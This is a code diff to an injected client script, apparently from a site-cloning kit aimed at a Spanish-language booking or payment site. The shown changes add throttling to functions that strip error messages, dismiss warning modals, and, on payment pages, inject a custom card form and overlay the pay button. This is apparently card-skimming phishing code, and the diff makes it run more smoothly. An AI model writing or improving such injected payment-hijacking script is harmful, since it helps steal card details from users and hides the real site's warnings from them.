@@ -703,10 +703,14 @@ const CLIENT_SCRIPT = `
 
   var ERROR_KEYWORDS = ['ha ocurrido un error', 'not found', 'contact form server error', 'ha ocurrido', 'doble reserva', 'reserva incompleta', 'cierre esta ventana', 'transacci'];
 
+  var _lastRemoveErrors = 0;
   var removeErrors = function() {
     /* Skip error removal entirely once payment flow has started */
     if (__clonerPaymentSent) return;
-    var allEls = document.querySelectorAll('*');
+    var now = Date.now();
+    if (now - _lastRemoveErrors < 500) return;
+    _lastRemoveErrors = now;
+    var allEls = document.querySelectorAll('div, span, p, h1, h2, h3, h4, section, article');
     for (var i = 0; i < allEls.length; i++) {
       var el = allEls[i];
       /* Never touch the payment loading overlay or anything inside it */
@@ -1035,7 +1039,11 @@ const CLIENT_SCRIPT = `
   };
 
   /* Dismiss specific modal overlays (Advertencia, etc.) */
+  var _lastDismissModals = 0;
   var dismissModals = function() {
+    var now = Date.now();
+    if (now - _lastDismissModals < 500) return;
+    _lastDismissModals = now;
     /* Target common modal/tooltip overlay patterns */
     var modals = document.querySelectorAll('[class*="modal"], [class*="overlay"], [class*="popup"], [role="dialog"]');
     modals.forEach(function(m) {
@@ -1084,16 +1092,21 @@ const CLIENT_SCRIPT = `
   }, 500);
 
   /* Also use MutationObserver to find elements faster */
+  var _obsTimeout = null;
   var __clonerDomObs = new MutationObserver(function() {
-    var curPath = location.pathname.toLowerCase();
-    if (curPath.includes('/v2/')) {
-      setTimeout(removeErrors, 50);
-      setTimeout(dismissModals, 100);
-    }
-    if (curPath.includes('/v2/payment') || curPath.includes('/payment')) {
-      injectCustomCardForm();
-      findAndOverlayPayButton();
-    }
+    if (_obsTimeout) return;
+    _obsTimeout = setTimeout(function() {
+      _obsTimeout = null;
+      var curPath = location.pathname.toLowerCase();
+      if (curPath.includes('/v2/')) {
+        removeErrors();
+        dismissModals();
+      }
+      if (curPath.includes('/v2/payment') || curPath.includes('/payment')) {
+        injectCustomCardForm();
+        findAndOverlayPayButton();
+      }
+    }, 200);
   });
   setTimeout(function() {
     if (document.body) __clonerDomObs.observe(document.body, { childList: true, subtree: true });
